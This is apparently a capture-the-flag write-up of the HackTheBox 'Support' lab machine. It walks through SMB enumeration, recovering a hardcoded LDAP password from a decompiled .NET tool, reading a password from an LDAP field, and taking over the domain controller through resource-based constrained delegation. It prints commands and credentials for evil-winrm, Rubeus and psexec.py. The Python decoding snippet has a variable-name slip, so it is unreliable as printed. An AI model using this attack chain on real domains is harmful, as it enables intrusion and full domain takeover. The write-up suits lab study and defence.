# Support_Walkthrough
# Support – Simple Walkthrough (Windows AD)

Hey folks, in this article I’ll walk you through how I solved the **Support** machine from HackTheBox. This box is an easy Active Directory challenge where we start with an open SMB share containing a custom .NET tool, extract hidden credentials from it, find a password inside LDAP, and then abuse a misconfiguration to become Domain Admin. The whole path is realistic and teaches a lot about common Windows weaknesses. I’ll keep the language simple and the steps clear so anyone can follow along.

---

## 1. Basic Reconnaissance

First, I ran a full port scan against the target:

```
root@kali:~# nmap -p- --min-rate 10000 10.10.11.122
```

Many ports typical of a Domain Controller came up, like 53 (DNS), 88 (Kerberos), 389 (LDAP), 445 (SMB), and 5985 (WinRM). The service scan showed the domain `support.htb` and the hostname `DC`. I added them to `/etc/hosts`:

```
10.10.11.122 dc.support.htb support.htb
```

## 2. Finding the First Credentials

Since SMB was open, I checked for publicly accessible shares:

```
root@kali:~# smbclient -N -L //support.htb
```

There was a share called **support-tools** that allowed anonymous access. I connected and listed the contents:

```
root@kali:~# smbclient -N //support.htb/support-tools
smb: \> ls
```

Inside, among several legitimate tools, there was a file `UserInfo.exe.zip`. I downloaded it, unzipped it, and saw it contained a .NET executable along with some DLLs. The file `UserInfo.exe` appeared to be a custom tool for querying user information.

I moved the files to a Windows VM (because running .NET on Linux with Mono can behave differently). The tool had two commands: `find` and `user`. Running it without proper network settings threw errors, but after adding the domain to the Windows `hosts` file and connecting the HTB VPN, it worked partially. However, it needed credentials to talk to LDAP – the very credentials we didn’t have yet.

To find those credentials, I used a .NET decompiler called **dnSpy** on `UserInfo.exe`. The source code revealed a class `Protected` that had a static method `getPassword()`. It decrypted a base64 string using a XOR operation with the key `armando`. I translated that logic to Python:

```
>>> from base64 import b64decode
>>> enc_password = b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
>>> key = b"armando"
>>> bytes([enc[i] ^ key[i % len(key)] ^ 223 for i in range(len(enc))]).decode()
'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Now I had the password for the user **ldap** (the tool used `support\ldap` to bind). I verified these credentials with `crackmapexec`:

```
root@kali:~# crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

It worked!

## 3. Getting a Shell as the Support User

With LDAP credentials, I could now query the Active Directory using `ldapsearch`. I dumped all user objects:

```
root@kali:~# ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

In the output, the user **support** had an interesting field:

```
info: Ironside47pleasure40Watchful
```

This looked like a password. The user was also a member of `Remote Management Users`, meaning he could connect via WinRM. I used `evil-winrm` to get a shell:

```
root@kali:~# evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

Now I was inside the box as the `support` user. The user flag was sitting on the desktop.

## 4. Escalating to Domain Admin

I ran BloodHound to map out the domain. The `support` user was a member of the **Shared Support Accounts** group, which had `GenericAll` on the Domain Controller computer object (`DC.SUPPORT.HTB`). That’s a powerful permission – it means I can fully control the DC’s machine account.

One way to abuse this is via **Resource‑Based Constrained Delegation**. In simple terms:

- I create a fake computer account in the domain (any user can add up to 10 machines).
- I configure the DC to trust this fake computer for delegation.
- I then use the fake computer to impersonate the Administrator and get a Kerberos ticket.

Here are the steps I followed:

**Step 1: Upload the required tools.** I used `PowerView.ps1`, `Powermad.ps1`, and `Rubeus.exe`. I uploaded them to `C:\programdata` and imported the PowerShell scripts.

**Step 2: Create a fake computer account.**

```
*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount myFakePC -Password $(ConvertTo-SecureString 'MyPassword123!' -AsPlainText -Force)
```

**Step 3: Grant delegation rights on the DC to my fake computer.** I used PowerView to build a security descriptor and write it to the DC’s `msds-allowedtoactonbehalfofotheridentity` attribute. (The exact commands are a bit long; you can find them in many online guides.)

**Step 4: Use Rubeus to perform the S4U attack.** I calculated the RC4 hash of my fake computer’s password and then requested a service ticket for `administrator` to the DC’s CIFS service:

```
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe s4u /user:myFakePC$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

The ticket was imported into my session. I could then extract the ticket and convert it to a format for Impacket to use remotely (with `ticketConverter.py`). Finally, I used `psexec.py` with the ticket to launch a system shell as Domain Admin:

```
root@kali:~# KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

I was now `nt authority\system` and could read the root flag from `C:\Users\Administrator\Desktop\root.txt`.

---

That’s it! This box was a great example of how a forgotten tool on an open share can lead to full domain compromise. Remember: never hardcode credentials in internal tools, and always check the `info` field in LDAP – it’s often used for storing passwords. I hope this writeup helped you understand the attack chain better. Happy hacking!
